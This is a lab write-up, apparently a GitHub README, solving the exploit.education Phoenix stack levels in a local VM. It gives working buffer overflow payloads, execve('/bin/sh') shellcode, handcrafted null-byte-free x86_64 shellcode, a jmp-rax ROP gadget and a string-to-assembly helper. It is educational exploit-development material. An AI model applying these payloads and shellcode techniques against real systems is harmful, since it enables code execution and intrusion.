# [Phoenix](https://exploit.education/phoenix/)

- All code under the `src/*` folder is from [exploit.education](https://exploit.education)

## Usage

- Install `QEMU-system-<arch>` package
- Download the Qcow2 QEMU Image, extract the content, run the `*.sh` script to start the QEMU Image.
- Upon the boot sequence complete, login with user / user, or root / root., or `ssh user@127.0.0.1 -p 2222`
- Quote from [GETTING STARTED](https://exploit.education/phoenix/getting-started/):

> The kernel.core_pattern is set to /var/lib/coredumps/core.%e.%s.%p, so check in /var/lib/coredumps for the final levels, if exploiting over the network.
> Files to be exploited reside in /opt/phoenix/<architecture> (e.g. amd64, i486, arm64, amd, etc)
> SUID files won’t create a core dump, so make a copy of the files as needed for exploit development purposes.

### Other issues

- [GDB/GEF ENCODING ERROR](https://github.com/hugsy/gef/issues/195)

```sh
export LC_CTYPE=C.UTF-8
```


## STACK_ZERO (Overwrite the next stack variable; gets())

- [STACK_ZERO-SRC](./src/stack-zero.c)

- Explain && Solution:

```sh
# ------------------------------------SRC-----------------------------------------
# struct {
#   char buffer[64];
#   volatile int changeme;
# } locals;
# ...
# gets(locals.buffer);
# ...
# if (locals.changeme != 0) {
# ...
# ------------------------------------EXPLAIN-------------------------------------
# - man 3 gets:
#
# SYNOPSIS
#        #include <stdio.h>
#
#        char *gets(char *s);
#
# gets() reads a line from stdin into the buffer pointed to by s until either
# a terminating newline or EOF, which it replaces with a null byte ('\0').
# ------------------------------------SOLUTION------------------------------------
# Input 64+ chars to overwrite the next stack variable.
python3 -c 'print("A" * 65 + "\n")' | ./stack-zero
```

![stack_zero-poc](./img/stack-zero-poc.png)


## STACK_ONE (Endianess. strcpy())

- [STACK_ONE-SRC](./src/stack-one.c)

- Explain && Solution:

```sh
# ------------------------------------SRC-----------------------------------------
# struct {
#   char buffer[64];
#   volatile int changeme;
# } locals;
# ...
# strcpy(locals.buffer, argv[1]);
# ...
# if (locals.changeme == 0x496c5962) {
# ...
# ------------------------------------EXPLAIN-------------------------------------
# - BIG ENDIAN
# - man 3 strcpy:
#
# SYNOPSIS
#      #include <string.h>
#
#      char *strcpy(char *dest, const char *src);
#
#      char *strncpy(char *dest, const char *src, size_t n);
#
# ------------------------------------SOLUTION------------------------------------
# Input 64 char + string in BIG ENDIAN to overwrite
./stack-one $(python3 -c 'print("A" * 64 + "\x62\x59\x6c\x49")')
```

![stack_one-poc](./img/stack-one-poc.png)


## STACK_TWO (Use an environment variable; strcpy())

- [STACK_TWO-SRC](./src/stack-two.c)

- Explain && Solution:

```sh
# ------------------------------------SRC-----------------------------------------
# struct {
#   char buffer[64];
#   volatile int changeme;
# } locals;
# ...
# ptr = getenv("ExploitEducation");
# ...
# strcpy(locals.buffer, ptr);
# ...
# if (locals.changeme == 0x0d0a090a) {
# ...
# ------------------------------------EXPLAIN-------------------------------------
# - man 3 getenv
# ------------------------------------SOLUTION------------------------------------
# Need the `export` to work.
export ExploitEducation=$(python3 -c 'print("A" * 64 + "\x0a\x09\x0a\x0d")'); ./stack-two
```

![stack_two-poc](./img/stack-two-poc.png)


## STACK_THREE (Find static address; objdump; gets())

- [STACK_THREE-SRC](./src/stack-three.c)

- Explain && Solution:

```sh
# ------------------------------------SRC-----------------------------------------
# void complete_level() { ... }
# int main(int argc, char **argv) {
#   struct {
#     char buffer[64];
#     volatile int (*fp)();
#   } locals;
#   ...
#   gets(locals.buffer);
#   ...
#     locals.fp();
#   ...
#   exit(0);
# }
# ------------------------------------EXPLAIN-------------------------------------
# - man objdump
# - objdump -d stack-three
# - objdump -t stack-three
# ------------------------------------SOLUTION------------------------------------
echo -en "$(python3 -c 'print("A" * 64)')\x9d\x06\x40\x00" | ./stack-three
```

- The symbol `complete_level` is a Global(g) Function(F)

![stack-three-find_addr](./img/stack-three-find_addr.png)

![stack_three-poc](./img/stack-three-poc.png)


## STACK_FOUR (Memory layout, call, ret, rip, eip, Function Prologue, Function Epilogue)

- [STACK_FOUR-SRC](./src/stack-four.c)

- Solution:

```sh
# ------------------------------------SRC-----------------------------------------
# void complete_level() { ... }
#
# void start_level() {
#   char buffer[64];
#   void *ret;
#
#   gets(buffer);
#
#   ret = __builtin_return_address(0);
#   printf("and will be returning to %p\n", ret);
# }
#
# int main(int argc, char **argv) {
#   ...
#   start_level();
# }
# ------------------------------------SOLUTION(x86_64)------------------------------------
# r < ./input.txt
r <<< $(python3 -c '(print("A"*64 + "BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK"))')
echo -en "$(python3 -c 'print("A"*64 + "G"*4*6)')\x1d\x06\x40\x00\x00\x00\x00\x00" | ./stack-four
```

- crash dump (`rip` == "HHHHIIII", hence simply change the "HHHHIIII" to `*complete_level` to complete):
![stack-four-crash_dump](./img/stack-four-crash_dump.png)
- The address of `complete_level`
![stack-four-find_addr](./img/stack-four-find_addr.png)
- stack_four-poc
![stack_four-poc](./img/stack-four-poc.png)

### STACK_FOUR-EXPLAIN_x86 (LINUX MEMORY MAPPING, FUNCTION PROLOGUE && FUNCTION EPILOGUE)

- Simplified x86 Layout of Physical Memory
![LINUX_MEMORY_LAYOUT_EXPLAIN](./img/linux_memory_layout_explain.png)

- To confirm, `sudo cat /proc/1/maps`, or see [Memory Mapping, Linux Kernel doc](https://linux-kernel-labs.github.io/refs/heads/master/labs/memory_mapping.html)
- More details in [Memory Mapping and DMA, LDD3-ch15](https://static.lwn.net/images/pdf/LDD3/ch15.pdf)

![LINUX_MEMORY_MAPPING](./img/linux_memory_mapping.png)


### STACK_FOUR-EXPLAIN_x86 (How do RIP or EIP change on ret)

- **The `rip` or `eip` is pushed to the stack on `call`.**
- **The `rip` or `eip` is poped from the stack on `ret`.**
- This behaviour is defined in the `call` and `ret` instructions.
- Tracing the change of `rip` in stack-four:
  + The asm (we trace the `eip` on `<main + 30>` and the next instruction):
  ![stack-four-asm](./img/stack-four-asm.png)
  + Initially, `eip` points to `<main + 30>`. When executed, the `eip` auto incremented to point to the next instruction, `<main + 35>` at `0x40068d`.
  + Then, because `<main + 30>` is a `call`, **the current `eip` is pushed to the stack**, then set to `<start_level + 0>` at `0x400635`
  + Now, as shown in the screenshot, we can peek into the topmost stack at `rsp` and see the stored `eip` value `0x40068d`.
  + This is the "return address". The address to the next insturction, after the `ret`.
  ![stack-four-eip-is-pushed-on-call](./img/stack-four-eip-is-pushed-on-call.png)

- More details about the `call` and `ret` behaviour, see [Intel® 64 and IA-32 Architectures Software Developer’s Manual](https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html):
[stack-four-x86-spec-of-call-and-ret](./img/stack-four-x86-spec-of-call-and-ret.png)


## STACK_FIVE (Custom shellcode)

- [STACK_FIVE-SRC](./src/stack-five.c)

- Solution:

```sh
# ------------------------------------SRC-----------------------------------------
# char *gets(char *);
#
# void start_level() {
#   char buffer[128];
#   gets(buffer);
# }
#
# int main(int argc, char **argv) {
#   ...
#   start_level();
# }
# ------------------------------------SOLUTION(x86)------------------------------------
# r < ./input.txt
# r <<< $(python3 -c '(print("A"*128 + "BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK"))')
# 0xf7ff8233 jmp esp
(python3 -c "import sys;eip=b'\x33\x82\xff\xf7';payload=b'\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80';sys.stdout.buffer.write(b'A'*(128+12) + eip + b'\x90'*200 + payload)";cat) | env -i /opt/phoenix/i486/stack-five
# ------------------------------------SOLUTION1, /bin/sh (x86_64)------------------------------
# r <<< $(python3 -c '(print("A"*(128+8) + "DDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK"))')
# execve('/bin/sh', 0, 0), the asm:
#
# push   rax
# xor    rdx,rdx
# xor    rsi,rsi
# movabs rbx,0x68732f6e69622f2f
# shr    rbx,0x8
# push   rbx
# push   rsp
# pop    rdi
# xor    rax,rax
# mov    al,0x3b
# syscall
(python3 -c "import sys;eip=b'\xd7\xc4\xd8\xf7\xff\x7f';payload=b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x54\x5f\x48\x31\xc0\xb0\x3b\x0f\x05';sys.stdout.buffer.write(b'\x90'*(128+8-len(payload)-16) + payload + b'\x90'*16 + eip)";cat) | env -i /opt/phoenix/amd64/stack-five
# ------------------------------------SOLUTION2, CUSTOM SHELLCODE (x86_64)---------------------
# execve("/bin/sh", [" ", "-c", "python3 -c 'print(\"123\")'"], NULL)
(python3 -c "import sys;eip=b'\xd7\xc4\xd8\xf7\xff\x7f';payload=b'\x4D\x31\xC0\x41\x50\x5B\xB3\xFF\x48\x29\xDC\x41\x50\x5F\x41\x50\x5E\x41\x50\x5A\x41\x50\x59\x41\x50\x58\xB0\x3B\x48\xBB\x2F\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEB\x08\x53\x54\x5F\x41\x50\x41\x50\x5B\xB3\x27\x53\x48\xBB\x74\x28\x22\x31\x32\x33\x22\x29\x53\x48\xBB\x2D\x63\x20\x27\x70\x72\x69\x6E\x53\x48\xBB\x70\x79\x74\x68\x6F\x6E\x33\x20\x53\x54\x41\x5D\x41\x50\x5B\x66\xBB\x2D\x63\x53\x54\x41\x5C\x41\x50\x5B\xB3\x20\x53\x54\x41\x5B\x41\x50\x41\x55\x41\x54\x41\x53\x54\x5E\x0F\x05';sys.stdout.buffer.write(b'\x90'*(128+8-len(payload)-8) + payload + b'\x90'*8 + eip)") | env -i /opt/phoenix/amd64/stack-five
r <<< $(python3 -c "import sys;eip=b'\xd7\xc4\xd8\xf7\xff\x7f';payload=b'\xcc\x4D\x31\xC0\x41\x50\x5B\xB3\xFF\x48\x29\xDC\x41\x50\x5F\x41\x50\x5E\x41\x50\x5A\x41\x50\x59\x41\x50\x58\xB0\x3B\x48\xBB\x2F\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEB\x08\x53\x54\x5F\x41\x50\x41\x50\x5B\xB3\x27\x53\x48\xBB\x74\x28\x22\x31\x32\x33\x22\x29\x53\x48\xBB\x2D\x63\x20\x27\x70\x72\x69\x6E\x53\x48\xBB\x70\x79\x74\x68\x6F\x6E\x33\x20\x53\x54\x41\x5D\x41\x50\x5B\x66\xBB\x2D\x63\x53\x54\x41\x5C\x41\x50\x5B\xB3\x20\x53\x54\x41\x5B\x41\x50\x41\x55\x41\x54\x41\x53\x54\x5E\x0F\x05';sys.stdout.buffer.write(b'\x90'*(128+8-len(payload)-8) + payload + b'\x90'*8 + eip)")
r <<< $(python3 -c "import sys;eip=b'\xd7\xc4\xd8\xf7\xff\x7f';payload=b'';sys.stdout.buffer.write("A"* 1600))")
r <<< $(python3 -c "print('A'* 600)")
```

![stack-five-x86-poc](./img/stack-five-x86-poc.png)
![stack-five-x86_64-poc](./img/stack-five-x86_64-poc.png)
![stack-five-x86_64-custom-shellcode](./img/stack-five-x86_64-custom-shellcode.png)


### STACK_FIVE-EXPLAIN (Jump to payload; `jmp esp`; `jmp rax`; ROP Gadgets)

- We do not have a function to jump to in stack_five.
- But we can write a some shellcode, then redirect the execution to it.
- However, the stack addresses can be effected by a few factors, it may be not easy to know the exact address where our payload ends up.
- But we may know the relative location of the payload.
- For example, in stack-five, when we smash the stack, we can see before the `ret`, the `rax` register points to a string controlled by us:

![stack-five-x86_64-stacksmashing](./img/stack-five-x86_64-stacksmashing.png)

- In this case, theoretically, if we can control the return address to points to a `jmp rax` instruction, the next instruction will be our payload.
- This technique is called "Return Oriented Programming (ROP)".
- These instructions are thus known as "ROP Gadgets".

- First, run the binary and check if there are static addresses (because the ASLR is not enabled on the kernel of phoenix image, `libc.so` is always loaded to the same memory address).

![stack-five-x86_64-info_proc_mappings](./img/stack-five-x86_64-info_proc_mappings.png)

- Find a `jmp rax` (`\xff\xe0`) ROP gadget (in a fixed address, in stack-five `libc.so`).

![stack-five-x86_64-jmp_rax](./img/stack-five-x86_64-jmp_rax.png)

- We use the first address `0x7ffff7d8c4d7` as our return address.


### STACK_FIVE-EXPLAIN (Shellcode before eip or after eip)


- For x86, when possible, put the shellcode after the `eip`, because:
  + The space after the `eip` is usually larger.
  + The payload is highly likely to exist somewhere after the `esp` pointer, once `ret` (because of the Function Epilogue).

- For x86_64, however, it is not always possible to put the payload after the `rip`. Because the 64 bits addresses almost always start with null bytes. In stack-five, data after `rip` cause the higher bits of `rip` be filled with garbage, so it may be hard to append payload after it.


### STACK_FIVE-EXPLAIN (HOW TO WRITE CUSTOM SHELLCODE)

#### SYSCALL 101 (What is a syscall)

- A syscall is a "programming interface" that an OS kernel provide to user programs. In Linux, this "programming interface" can be a C function.
- **A program can request the kernel to "do something" by invoking the syscall.**
- Specifically, to allocate some memory, to read a file, to read user input and etc.
- Those tasks would be hard, complex or inefficient for each program to carry out by itself.
- For example, to read or write a file. Ultimately we may want to manipulate some electromagnetic record. But the process could be so physically different depending on the storage device: a SSD, a 3.5 inch floppy disk or a cassette tape. It would be a bit too much if every user program has to worry about that.
- Thankfully, the OS kernel do this for us. It provides some syscalls, e.g. `open`, `read`.
- So a user program can simply invoke the function, e.g. `open('/path/to/file', ...)`, then the OS kernel will actually find the data physically, whether it is on a SSD or a floopy disk, then return the result back to the user program.


#### SYSCALL 101 (What is `execve`)

- `man execve` explains all. In short, the `execve` is a syscall that "execute a grogram".

```txt
EXECVE(2)        Linux Programmer's Manual        EXECVE(2)

NAME
       execve - execute program

SYNOPSIS
       #include <unistd.h>

       int execve(const char *pathname, char *const argv[],
                  char *const envp[]);

DESCRIPTION
       execve() executes the program referred to by pathname.  This causes
       the program that is currently being run by the calling process to be
       replaced with a new program, with newly initialized stack, heap, and
       (initialized and uninitialized) data segments.

       ...

       argv is an array of  argument strings passed to the new program.
       By convention, the first of these strings (i.e., argv[0]) should contain
       the filename associated with the file being executed.   envp  is an
       array  of strings, conventionally of the form key=value, which are
       passed as environment to the new program.  The argv and envp arrays must
       each include a null pointer at the end of the array.

       The argument vector and environment can be accessed by the called
       program's main function, when it is defined as:

           int main(int argc, char *argv[], char *envp[])

```

- Following the manual, we can write the following C code to list current directory (same as `/bin/sh -c "ls -lah"`)

```C
#include <unistd.h>
int main() {
    char *program = "/bin/sh";
    // argv[0]: (similar to the `$0` in bash script)
    // argv[1] and onwards: the "arguments" of program "/bin/sh"
    // argv array end with NULL
    char *argv[] = {" ", "-c", "ls -la", NULL};
    execve(program, argv, 0);
}
```


#### SYSCALL 101 (How to invoke a syscall in assembly; where are the rules defined -- x86_64 CALLING CONVENTION && ABI)

- By the very definition of syscall, they are defined by "OS kernel".
- Generally, a kernel would interact with the hardware through CPU, which consume binary instructions, whose readable format is assembly. In other words, one may say the rules are in assembly level.
- The rules of "how to invoke a syscall in assembly" is defined in the "Application Binary Interface (ABI)" document of the corresponding kernel. For example, the linux-amd64 ABI defines its calling convention as follows, it basically says that, variables should be passed by reference, and the pointers to the 1st, 2nd, ..., 6th function variable should be stored at `rdi`, `rsi`, `rdx`, `rcx or r10`, `r8`, `r9` register, along with some other rules:

![linux-amd64-abi-calling-conventions](./img/linux-amd64-abi-calling-conventions.png)


#### SYSCALL 101 (What is shellcode)

- Shellcode is a trunk of binary data, which can be interpreted as executable instructions by CPU.
- Shellcode can be "translate" to its human readable form -- the assembly, and vice versa.
- For example, in x86_64 architecture, shellcode `0xcc` means `int3` in assembly, which is an "instruction" that tell CPU to pause the execution like when a "breakpoint" is hit.


#### SYSCALL 101 (Handcraft x86_64 shellcode)

- Goal: craft shellcode that invoke the execve syscall to execute arbitrary commands.
- Restrictions of the shellcode:
  + must not contains null byte (it is a "bad char")
  + must do everything "on the fly" (use instructions only; cannot control .data section, etc.)

- First, following the previous explaintion, we can invoke execve syscall in C like this, to print a string with python3.

```C
#include <unistd.h>
int main() {
    // The 1st argument is a string (or a pointer (that points to the first char) of a C-style-string)
    char *program = "/bin/sh";
    // The 2nd argument is a string array (a pointer to an array of C-style-string-pointers)
    char *argv[] = {" ", "-c", "python3 -c 'print(\"123\")'", NULL};
    execve(program, argv, 0);
}
```

- Now, following the ABI, we can write the shellcode that do the same thing.

- First, prepare the rax, the following assembly would do:

```asm
// ==== Prepare the syscall number ====
// Store the syscall number in rax, as per definition in the ABI
// 0x3b is the syscall number that tells the CPU, it is the execve syscall that we want to invoke
// mov rax, 0x3b ; we want to do this, but this instruction contains null byte (\x48\xC7\xC0\x3B\x00\x00\x00)
// do the same without null byte:
xor rax, rax // \x48\x31\xC0
mov al, 0x3b // \xB0\x3B
```

- Prepare the 1st argument (rdi), it should be a pointer to the C-style-string "/bin/sh", the following assembly would do:

```asm
// ==== Prepare the 1st argument ====
// The "/bin/sh" ASCII string in "Little Endian"
// movabs rbx,0x0068732f6e69622f ; \x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00
// null byte free:
movabs rbx,0x68732f6e69622f2f
shr    rbx,0x8

// Store the "/bin/sh" string on the stack
push rbx
// Push the string pointer onto the stack for temporary storage
// (Since "/bin/sh" is now at the top the stack,
// the current rsp points to the C-style-string "/bin/sh")
push rsp

// Store the 1st argument in rdi, as per definition in the ABI
pop rdi
```

- Prepare the 2nd argument (rsi), `char *argv[] = {" ", "-c", "python3 -c 'print(\"123\")'", NULL};`; invoke the syscall.
- The `rsi` should be a pointer to a string array. The memory layout is as follows; simply put, the `$rsi`, `$rsi+8` and `$rsi+16` points to three C-style-strings `argv[0]`, `argv[1]`, `argv[2]` respectively, and `$rsi+24` is 0x0:

![the memory layout of the rsi](./img/stack-five-shellcode-rsi.png)

- The assembly:

```asm
xor r8, r8
// ==== Prepare the 2nd argument ====
// Store the 3rd string "python3 -c 'print(\"123\")'"
// More on the memory mapping of the Little Endian string is explain in the
// `parse_str_to_asm_amd64` function
// p = b"python3 -c 'print(\"123\")'"
// print(parse_str_to_asm_amd64(p))
push r8
pop rbx
mov bl, 0x27
push rbx
movabs rbx,0x2922333231222874
push rbx
movabs rbx,0x6e6972702720632d
push rbx
movabs rbx,0x20336e6f68747970
push rbx
push rsp
pop r13

// Store the 2nd string "-c"
// p=b"-c"
// movabs rbx,0x632d2f2f2f2f2f2f
// shr rbx,0x30
push r8
pop rbx
mov bx, 0x632d
push rbx
push rsp
pop r12

// Store the 1st string; by convention, this is the process name
// p=b" "
// movabs rbx,0x202f2f2f2f2f2f2f
// shr rbx,0x38
push r8
pop rbx
mov bl, 0x20
push rbx
push rsp
pop r11

// Push 0x0 to mark the end of the array
push r8
// Store the pointers of the 3rd, 2nd, 1st string and set `rsi`
push r13
push r12
push r11
push rsp
pop rsi
// invoke the syscall
syscall
```

- PARSE_STR_TO_ASM_AMD64 (a function to parse Little Endian C-style-string)

```python3
def parse_str_to_asm_amd64(payloads_bytes, little_endian=True):
    """
    p = b"python3 -c 'print(\"123\")'"
    print(parse_str_to_asm_amd64(p))
    Input: an ASCII string in bytes
    Output: the x86_64 assembly to put the string into the stack, in little_endian

    [e|r]sp **reduce** [4|8] bytes on each `push`
    For little_endian 64 bits system, in gdb notation:
    The string `-c 'print("123")'` is represented as follow:

    0x7fffffffe3a9: 0x6e6972702720632d      0x2922333231222874
                  :   n i r p '   c -         ) " 3 2 1 " ( t
    ----------e3--: <-HIGH--ad--ab--a9      --b8------------b1
    0x7fffffffe3b9: 0x0000000000000027
                  :                 '
    ----------e3--: <-HIGH--bd--bb--b9

    b`\x27` @e3b9 is the last byte, in asm should be pushed first.
    (Think of a C string, the 1st char has the lowest address)
    """
    byte_arr = bytearray(p)
    if little_endian:
        byte_arr.reverse()
    o=""
    step = 8     # 8 bytes, 64bits
    cmd = ""
    res = len(byte_arr) % step
    # First, process the trailing bytes, those bytes need padding
    # We can also refactor this block later to improve efficiency, e.g.:
    # xor rbx,rbx
    # mov bl, 0x27
    # push rbx
    if res > 0:
        block = byte_arr[0:res]
        cmd += "movabs rbx,0x" + block.hex()
        byte_padding = step - res
        cmd += "2f" * byte_padding
        cmd += f"\nshr rbx,{hex(byte_padding * 8)}"
        cmd += "\npush rbx\n"
    # Next, process the other bytes
    for i in range(res, len(byte_arr), step):
        block = byte_arr[i:i+step]
        cmd += "movabs rbx,0x" + block.hex()
        cmd += "\npush rbx\n"
    return cmd

p = b"bash -c python3 -c 'print(\"123\")'"
print(parse_str_to_asm_amd64(p))
```

- Finally, when pushing variables to the stacks, each `push` directive will reduce `rsp`.
- In stack-five, we may have to put the shellcode before the `rip` in a payload. In that case, our shellcode can be overwritten by a `push` instruction. (Because Function Epilogue happens first, `mov rsp, rbp` before the `ret`)
- To fix the issue, we can create more stack spaces in the beginning of the payload, see the full assembly as follows:

```asm
// ==== x86_64 PoC shellcode to make syscall with parameters ====
// execve("/bin/sh", [" ", "-c", "python3 -c 'print(\"123\")'"], NULL)
xor    r8,r8

// `sub rsp, 0xff`, null byte free
// Set up `rsp` to point to a lower address than our shellcode, to make space for the variables
push   r8
pop    rbx
mov    bl,0xff
sub    rsp,rbx

// Set to 0x0: rdi, rsi, rdx, rcx[, r8, r9]
// Initialize the parameters of syscall to 0x0
push   r8
pop    rdi
push   r8
pop    rsi
push   r8
pop    rdx
push   r8
pop    rcx

// ==== Prepare the syscall number ====
// `mov rax,0x3b`, null byte free
// Set the x86_64 syscall number of `execve`
push   r8
pop    rax
mov    al,0x3b

// ==== Prepare the 1st argument ====
// Store the pointer to the pathname string (of the binary to invoke) "/bin/sh" to `rdi`, null byte free
// The string can also be `/bin/python` or whatever path, `rdi` will be its 64 bits string pointer
movabs rbx,0x68732f6e69622f2f   # rbx: '//bin/sh'
shr    rbx,0x8                  # rbx: '/bin/sh'
push   rbx
push   rsp
pop    rdi

// Push a 0x0 to ensure the strings ends with a 0x0
push   r8

// to debug
// int3

// ==== Prepare the 2nd argument ====
// Store the pointer to the string array in `rsi`
// char *argv[] = {"process_name", "-c", "python3 -c 'print(\"3\")", NULL};
//
// The 3rd string
// The string format is explained in the `parse_str_to_asm_amd64` function
// p = b"python3 -c 'print(\"123\")'"
// print(parse_str_to_asm_amd64(p))
push r8
pop rbx
mov bl, 0x27
push rbx
movabs rbx,0x2922333231222874
push rbx
movabs rbx,0x6e6972702720632d
push rbx
movabs rbx,0x20336e6f68747970
push rbx
push rsp
pop r13

// The 2nd string
// p=b"-c"
// movabs rbx,0x632d2f2f2f2f2f2f
// shr rbx,0x30
push r8
pop rbx
mov bx, 0x632d
push rbx
push rsp
pop r12

// The 1st string; by convention, this is the process name
// p=b" "
// movabs rbx,0x202f2f2f2f2f2f2f
// shr rbx,0x38
push r8
pop rbx
mov bl, 0x20
push rbx
push rsp
pop r11

// Push 0x0 to mark the end of the array
push r8
// Store the pointers of the 3rd, 2nd, 1st string and set `rsi`
push r13
push r12
push r11
push rsp
pop rsi
syscall
```

![stack-five-x86_64-custom-shellcode](./img/stack-five-x86_64-custom-shellcode.png)

## STACK_SIX

TODO
